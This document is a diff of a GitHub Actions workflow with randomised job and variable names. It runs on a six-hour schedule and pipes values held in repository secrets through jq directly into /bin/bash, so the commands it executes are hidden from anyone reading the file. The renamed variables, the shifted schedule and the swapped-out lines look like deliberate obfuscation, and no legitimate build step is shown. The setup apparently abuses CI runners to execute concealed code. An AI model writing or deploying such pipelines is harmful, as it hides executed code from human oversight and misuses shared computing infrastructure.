@@ -3,25 +3,22 @@ name: luorenzong1098
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 4/6 * * *'
+    - cron: '29 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: luorenzong1098
         env:
-          kzc197: ${{ secrets.kzc197 }}
+          wbd96217: ${{ secrets.wbd96217 }}
         run: |
-          echo $kzc197 | jq -r .tibs32 | /bin/bash
-          echo $kcjzu40 | jq -r .icgh0 | /bin/bash
-          echo $h779 | jq -r .yrku24703 | /bin/bash
-          echo $xe958 | jq -r .pqk605 | /bin/bash
-          echo $six05 | jq -r .goxbd87369 | /bin/bash
-          echo $j13 | jq -r .xaqjz93 | /bin/bash
-          echo $o408 | jq -r .dd54 | /bin/bash
-          echo $k23797 | jq -r .ufmgy68384 | /bin/bash
-          echo $o3153 | jq -r .kh268 | /bin/bash
-          echo $rqdt20 | jq -r .odhx884 | /bin/bash
+          echo $wbd96217 | jq -r .zic9856 | /bin/bash
+          echo $kyrd48 | jq -r .a142 | /bin/bash
+          echo $qx54187 | jq -r .sh8622 | /bin/bash
+          echo $ok779 | jq -r .kl5192 | /bin/bash
+          echo $ovadn72466 | jq -r .fu7054 | /bin/bash
+          echo $wo45 | jq -r .vtm2766 | /bin/bash
 
